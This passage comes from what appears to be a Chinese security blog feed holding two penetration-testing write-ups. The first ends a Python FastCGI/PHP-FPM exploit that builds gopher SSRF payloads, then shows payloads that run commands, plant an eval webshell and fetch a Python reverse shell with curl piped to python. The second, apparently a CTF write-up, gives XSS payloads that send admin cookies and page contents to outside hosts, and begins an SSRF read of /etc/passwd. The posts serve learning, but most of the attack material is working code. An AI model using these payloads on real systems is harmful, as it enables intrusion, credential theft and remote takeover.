isinstance(s, bytes)<span class="symbol">:</span></span><br><span class="line">        s = str(s, <span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line">    <span class="symbol">else:</span></span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">""</span><span class="string">"A Fast-CGI Client for Python"</span><span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, host, port, timeout, keepalive)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.host = host</span><br><span class="line">        <span class="keyword">self</span>.port = port</span><br><span class="line">        <span class="keyword">self</span>.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> <span class="symbol">keepalive:</span></span><br><span class="line">            <span class="keyword">self</span>.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            <span class="keyword">self</span>.keepalive = <span class="number">0</span></span><br><span class="line">        <span class="keyword">self</span>.sock = None</span><br><span class="line">        <span class="keyword">self</span>.requests = dict()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        <span class="keyword">self</span>.sock.settimeout(<span class="keyword">self</span>.timeout)</span><br><span class="line">        <span class="keyword">self</span>.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="symbol">try:</span></span><br><span class="line">            <span class="keyword">self</span>.sock.connect((<span class="keyword">self</span>.host, int(<span class="keyword">self</span>.port)))</span><br><span class="line">        except socket.error as <span class="symbol">msg:</span></span><br><span class="line">            <span class="keyword">self</span>.sock.close()</span><br><span class="line">            <span class="keyword">self</span>.sock = None</span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> False</span><br><span class="line">        <span class="keyword">return</span> True</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span><span class="params">(<span class="keyword">self</span>, fcgi_type, content, requestid)</span></span><span class="symbol">:</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid <span class="meta">&gt;&gt; </span><span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length <span class="meta">&gt;&gt; </span><span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span><span class="params">(<span class="keyword">self</span>, name, value)</span></span><span class="symbol">:</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = b<span class="string">''</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span><span class="symbol">:</span></span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            record += bchr((nLen <span class="meta">&gt;&gt; </span><span class="number">24</span>) <span class="params">| 0x80) \</span></span><br><span class="line"><span class="params">                      + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \</span></span><br><span class="line"><span class="params">                      + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \</span></span><br><span class="line"><span class="params">                      + bchr(nLen &amp; 0xFF)</span></span><br><span class="line"><span class="params">        <span class="keyword">if</span> vLen &lt; 128:</span></span><br><span class="line"><span class="params">            record += bchr(vLen)</span></span><br><span class="line"><span class="params">        <span class="keyword">else</span>:</span></span><br><span class="line"><span class="params">            record += bchr((vLen &gt;&gt; 24) |</span> <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen <span class="meta">&gt;&gt; </span><span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen <span class="meta">&gt;&gt; </span><span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span><span class="params">(<span class="keyword">self</span>, stream)</span></span><span class="symbol">:</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">'version'</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">'type'</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">'requestId'</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">'contentLength'</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">'paddingLength'</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">'reserved'</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span><span class="params">(<span class="keyword">self</span>, buffer)</span></span><span class="symbol">:</span></span><br><span class="line">        header = buffer.read(int(<span class="keyword">self</span>.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="symbol">header:</span></span><br><span class="line">            <span class="keyword">return</span> False</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            record = <span class="keyword">self</span>.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">'content'</span>] = b<span class="string">''</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">'contentLength'</span> <span class="keyword">in</span> record.keys()<span class="symbol">:</span></span><br><span class="line">                contentLength = int(record[<span class="string">'contentLength'</span>])</span><br><span class="line">                record[<span class="string">'content'</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'paddingLength'</span> <span class="keyword">in</span> record.keys()<span class="symbol">:</span></span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">'paddingLength'</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(<span class="keyword">self</span>, nameValuePairs=&#123;&#125;, post=<span class="string">''</span>)</span></span><span class="symbol">:</span></span><br><span class="line">       <span class="comment"># if not self.__connect():</span></span><br><span class="line">        <span class="comment">#    print('connect failure! please check your fasctcgi-server !!')</span></span><br><span class="line">         <span class="comment">#   return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">self</span>.requests[requestId] = dict()</span><br><span class="line">        request = b<span class="string">""</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(<span class="keyword">self</span>.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += <span class="keyword">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = b<span class="string">''</span></span><br><span class="line">        <span class="keyword">if</span> <span class="symbol">nameValuePairs:</span></span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items()<span class="symbol">:</span></span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += <span class="keyword">self</span>.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="symbol">paramsRecord:</span></span><br><span class="line">            request += <span class="keyword">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += <span class="keyword">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b<span class="string">''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="symbol">post:</span></span><br><span class="line">            request += <span class="keyword">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += <span class="keyword">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b<span class="string">''</span>, requestId)</span><br><span class="line">        <span class="comment">#print base64.b64encode(request)</span></span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line">        <span class="comment"># self.sock.send(request)</span></span><br><span class="line">        <span class="comment"># self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND</span></span><br><span class="line">        <span class="comment"># self.requests[requestId]['response'] = b''</span></span><br><span class="line">        <span class="comment"># return self.__waitForResponse(requestId)</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span><span class="params">(<span class="keyword">self</span>, requestId)</span></span><span class="symbol">:</span></span><br><span class="line">        data = b<span class="string">''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="symbol">True:</span></span><br><span class="line">            buf = <span class="keyword">self</span>.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf)<span class="symbol">:</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="symbol">True:</span></span><br><span class="line">            response = <span class="keyword">self</span>.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="symbol">response:</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">'type'</span>] == FastCGIClient.<span class="symbol">__FCGI_TYPE_STDERR:</span></span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.<span class="symbol">__FCGI_TYPE_STDERR:</span></span><br><span class="line">                    <span class="keyword">self</span>.requests[<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">'requestId'</span>])<span class="symbol">:</span></span><br><span class="line">                    <span class="keyword">self</span>.requests[requestId][<span class="string">'response'</span>] += response[<span class="string">'content'</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.<span class="symbol">FCGI_STATE_SUCCESS:</span></span><br><span class="line">                <span class="keyword">self</span>.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.requests[requestId][<span class="string">'response'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"fastcgi connect host:&#123;&#125; port:&#123;&#125;"</span>.format(<span class="keyword">self</span>.host, <span class="keyword">self</span>.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">'__main__'</span><span class="symbol">:</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Php-fpm code execution vulnerability client.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'host'</span>, help=<span class="string">'Target host, such as 127.0.0.1'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'file'</span>, help=<span class="string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--code'</span>, help=<span class="string">'What php code your want to execute'</span>, default=<span class="string">''</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, help=<span class="string">'FastCGI port'</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">"/"</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'GATEWAY_INTERFACE'</span>: <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">        <span class="string">'REQUEST_METHOD'</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="string">'SCRIPT_FILENAME'</span>: documentRoot + uri.lstrip(<span class="string">'/'</span>),</span><br><span class="line">        <span class="string">'SCRIPT_NAME'</span>: uri,</span><br><span class="line">        <span class="string">'QUERY_STRING'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'REQUEST_URI'</span>: uri,</span><br><span class="line">        <span class="string">'DOCUMENT_ROOT'</span>: documentRoot,</span><br><span class="line">        <span class="string">'SERVER_SOFTWARE'</span>: <span class="string">'php/fcgiclient'</span>,</span><br><span class="line">        <span class="string">'REMOTE_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'REMOTE_PORT'</span>: <span class="string">'9985'</span>,</span><br><span class="line">        <span class="string">'SERVER_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">        <span class="string">'SERVER_NAME'</span>: <span class="string">"localhost"</span>,</span><br><span class="line">        <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span>,</span><br><span class="line">        <span class="string">'CONTENT_TYPE'</span>: <span class="string">'application/text'</span>,</span><br><span class="line">        <span class="string">'CONTENT_LENGTH'</span>: <span class="string">"%d"</span> % len(content),</span><br><span class="line">        <span class="string">'PHP_VALUE'</span>: <span class="string">'auto_prepend_file = php://input'</span>,</span><br><span class="line">        <span class="string">'PHP_ADMIN_VALUE'</span>: <span class="string">'allow_url_include = On'</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    response = urllib.quote(response)</span><br><span class="line">    print(<span class="string">"gopher://127.0.0.1:"</span> + str(args.port) + <span class="string">"/_"</span> + response)</span><br></pre></td></tr></table></figure></p><p>使用方式<code>python exp.py -c phpcode -p port host filename</code><br>这里需要注意的是，PHP-FRM在接收到请求时，会首先查看要操作的文件是否存在，因此这里需要提供filename并且为已知路径的php文件。<br>如果不知道的话，可以使用服务器安装php时默认安装的php文件<br><img src="https://i.loli.net/2019/05/05/5cced30a820a9.png" alt><br>然后即可利用上面的exp生成payload<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fastcgi_gopher.py -c "<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">' xxxx &gt;&gt;'</span>;<span class="keyword">echo</span> @<span class="keyword">eval</span>(system(<span class="string">'whoami'</span>));<span class="keyword">exit</span>; <span class="meta">?&gt;</span></span>"  -p 9000 127.0.0.1 /usr/share/php/PEAR/Downloader/Package.php</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/05/05/5cced38475561.png" alt></p><p>通过ssrf漏洞页面提交payload时需要将其再进行一次Url编码<br><img src="https://i.loli.net/2019/05/05/5cced490b73a9.png" alt></p><p>同样可以利用代码执行写入一句话webshell<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fastcgi_gopher.py -c <span class="string">"&lt;?php file_put_contents('/home/www/html/boogle.php', base64_decode('PD9waHAgZXZhbCgkX1BPU1RbYm9vZ2xlXSk7Pz4=')); ?&gt;"</span>  -p <span class="number">9000</span> <span class="number">127.0</span>.<span class="number">0.1</span> <span class="regexp">/usr/</span>share<span class="regexp">/php/</span>PEAR<span class="regexp">/Downloader/</span><span class="keyword">Package</span>.php</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/05/05/5cceda2c03945.png" alt><br>如果目录没有权限写入的话还可以反弹shell<br>这里使用bash反弹有点问题，改用python。<br>开一个web服务，bash.py中写入<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import <span class="built_in">socket</span>,subprocess,os  </span><br><span class="line">s=<span class="built_in">socket</span>.<span class="built_in">socket</span>(<span class="built_in">socket</span>.AF_INET,<span class="built_in">socket</span>.SOCK_STREAM)  </span><br><span class="line">s.connect((<span class="string">"192.168.111.145"</span>,<span class="number">2333</span>))  </span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)  </span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)  </span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)  </span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure></p><p>然后在<code>192.168.111.145</code>监听<code>2333</code>端口<br>padload如下<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fastcgi_gopher.py -c "<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(system(<span class="string">'curl http://192.168.111.145/bash.py|python'</span>));<span class="keyword">die</span>(<span class="string">'-------boo--------'</span>); <span class="meta">?&gt;</span></span>" -p 9000 127.0.0.1 /usr/share/php/PEAR/Downloader/Package.php</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/05/06/5ccff09a3fb15.png" alt></p><h2 id="0x06-后记"><a href="#0x06-后记" class="headerlink" title="0x06 后记"></a>0x06 后记</h2><p>本文依照前人经验进行了一波学习，仅在未加任何防护的代码上了进行了ssrf常用手法的测试。<br>ssrf可以说是一扇通往内网的大门，虽然可能会因为种种限制或者没有回显而难以利用，但其一旦被撕开，内网将会深入其害，ssrf姿势千姿百态，日后碰到其他骚姿势将继续记录。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;SSRF（Server-Side RequestForgery）服务端请求伪造，是一种由攻击者构造形
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ssrf" scheme="https://zhengbao.wang/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>XSSRF攻击内网redis</title>
    <link href="https://zhengbao.wang/XSSRF%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91redis/"/>
    <id>https://zhengbao.wang/XSSRF攻击内网redis/</id>
    <published>2019-05-03T03:23:19.000Z</published>
    <updated>2019-05-03T03:24:30.278Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h2><p>由于本菜鸡对xss的认识还停留在弹个框框的层面上，写此文章以求进步。</p><p>在实际过程中经常会出现拿到了cookie，却发现后台登陆在内网的情况，本文刚好发现了这样一个xss测试环境，并且在该环境中进一步利用xss结合ssrf攻击了内网的redis服务器，特此记录。</p><h2 id="0x01-XSS获取管理员cooklie"><a href="#0x01-XSS获取管理员cooklie" class="headerlink" title="0x01 XSS获取管理员cooklie"></a>0x01 XSS获取管理员cooklie</h2><p>环境地址:<a href="https://xssrf.hackme.inndy.tw" target="_blank" rel="noopener">https://xssrf.hackme.inndy.tw</a><br>在该环境中有一个send email的功能，可以给管理员发送含有xss的payload以获取其cookie。<br>这里简单测试。发现过滤了<code>&lt;script</code> <code>(</code> <code>)</code> <code>onerror</code>等关键词。<br><img src="https://i.loli.net/2019/05/01/5cc909e2d34e3.png" alt><br>这里可以看到<code>onerror</code>前面是加了空格的，那么可以用下面的payload染过<br>payload<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">img</span> src=<span class="string">"x"</span>onerror=<span class="string">"document.location='http://ay82rc.ceye.io/'+document.cookie"</span>&gt;</span><br></pre></td></tr></table></figure></p><p>发送后管理员查看即可成功返回cookie。<br><img src="https://i.loli.net/2019/05/01/5cc9093e268dc.png" alt></p><h2 id="0x02-xss登陆内网后台"><a href="#0x02-xss登陆内网后台" class="headerlink" title="0x02 xss登陆内网后台"></a>0x02 xss登陆内网后台</h2><p>拿到cookie后这里直接以cookie登陆，发现限制了管理员需要从内网登陆。这里也符合很多实际场景。<br><img src="https://i.loli.net/2019/05/01/5cc90d4791ba5.png" alt></p><p>那么这里可以直接使用xss然后通过<code>document.body.innerHTML</code>打印出其后台页面。<br>修改上面的payload，但是上面已经过滤<code>()</code>，这里可以使用编码绕过。推荐余弦大大的xss在线编码平台<a href="http://www.xssor.io" target="_blank" rel="noopener">xss’or</a><br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">img</span> src=<span class="string">"x"</span>onerror=<span class="string">"document.location='http://ay82rc.ceye.io/'+btoa(document.body.innerHTML)"</span>&gt;</span><br></pre></td></tr></table></figure></p><p>16进制编码后<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"x"</span>onerror=<span class="string">"&amp;<span class="subst">#x0064</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x0063</span>;&amp;<span class="subst">#x0075</span>;&amp;<span class="subst">#x006d</span>;&amp;<span class="subst">#x0065</span>;&amp;<span class="subst">#x006e</span>;&amp;<span class="subst">#x0074</span>;&amp;<span class="subst">#x002e</span>;&amp;<span class="subst">#x006c</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x0063</span>;&amp;<span class="subst">#x0061</span>;&amp;<span class="subst">#x0074</span>;&amp;<span class="subst">#x0069</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x006e</span>;&amp;<span class="subst">#x003d</span>;&amp;<span class="subst">#x0027</span>;&amp;<span class="subst">#x0068</span>;&amp;<span class="subst">#x0074</span>;&amp;<span class="subst">#x0074</span>;&amp;<span class="subst">#x0070</span>;&amp;<span class="subst">#x003a</span>;&amp;<span class="subst">#x002f</span>;&amp;<span class="subst">#x002f</span>;&amp;<span class="subst">#x0061</span>;&amp;<span class="subst">#x0079</span>;&amp;<span class="subst">#x0038</span>;&amp;<span class="subst">#x0032</span>;&amp;<span class="subst">#x0072</span>;&amp;<span class="subst">#x0063</span>;&amp;<span class="subst">#x002e</span>;&amp;<span class="subst">#x0063</span>;&amp;<span class="subst">#x0065</span>;&amp;<span class="subst">#x0079</span>;&amp;<span class="subst">#x0065</span>;&amp;<span class="subst">#x002e</span>;&amp;<span class="subst">#x0069</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x002f</span>;&amp;<span class="subst">#x0027</span>;&amp;<span class="subst">#x002b</span>;&amp;<span class="subst">#x0062</span>;&amp;<span class="subst">#x0074</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x0061</span>;&amp;<span class="subst">#x0028</span>;&amp;<span class="subst">#x0064</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x0063</span>;&amp;<span class="subst">#x0075</span>;&amp;<span class="subst">#x006d</span>;&amp;<span class="subst">#x0065</span>;&amp;<span class="subst">#x006e</span>;&amp;<span class="subst">#x0074</span>;&amp;<span class="subst">#x002e</span>;&amp;<span class="subst">#x0062</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x0064</span>;&amp;<span class="subst">#x0079</span>;&amp;<span class="subst">#x002e</span>;&amp;<span class="subst">#x0069</span>;&amp;<span class="subst">#x006e</span>;&amp;<span class="subst">#x006e</span>;&amp;<span class="subst">#x0065</span>;&amp;<span class="subst">#x0072</span>;&amp;<span class="subst">#x0048</span>;&amp;<span class="subst">#x0054</span>;&amp;<span class="subst">#x004d</span>;&amp;<span class="subst">#x004c</span>;&amp;<span class="subst">#x0029</span>;"</span>&gt;</span><br></pre></td></tr></table></figure></p><p>成功获取到内容<br><img src="https://i.loli.net/2019/05/01/5cc911cf367de.png" alt><br>将内容base64解码<br><img src="https://i.loli.net/2019/05/01/5cc912d520bb9.png" alt><br>保存为html即可看到后台内容,并且登陆账号为admin。<br><img src="https://i.loli.net/2019/05/01/5cc913781b339.png" alt></p><p>这里可以看到两个管理员所特有的功能点<code>set admin</code> <code>send request</code><br>继续获取一下<code>request.php</code>的内容<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attr">src="x"onerror="</span></span><br><span class="line"><span class="attr">xmlhttp</span> = new XMLHttpRequest();</span><br><span class="line">xmlhttp.<span class="attr">onreadystatechange=function()&#123;</span></span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.<span class="attr">readyState</span> == <span class="number">4</span> &amp;&amp; xmlhttp.<span class="attr">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">        document.<span class="attr">location</span> = 'http://zhengbao.wang?'+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"request.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br><span class="line"><span class="string">"&gt;</span></span><br></pre></td></tr></table></figure></p><p>将payload编码发送,注意这里ceye服务器收不到回显，不知为何，改用自己的vps</p><p>成功读取到<code>request.php</code>页面内容。<br><img src="https://i.loli.net/2019/05/02/5ccaefd42756d.png" alt><br>base64解码后看到有发送url的操作，这里猜测具有ssrf<br><img src="https://i.loli.net/2019/05/02/5ccaf0a0811e6.png" alt></p><h2 id="0x02-xssrf-file协议任意文件读取"><a href="#0x02-xssrf-file协议任意文件读取" class="headerlink" title="0x02 xssrf file协议任意文件读取"></a>0x02 xssrf file协议任意文件读取</h2><p>继续构造payload，利用ssrf通过<code>file</code>协议读取<code>/etc/passwd</code><br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span 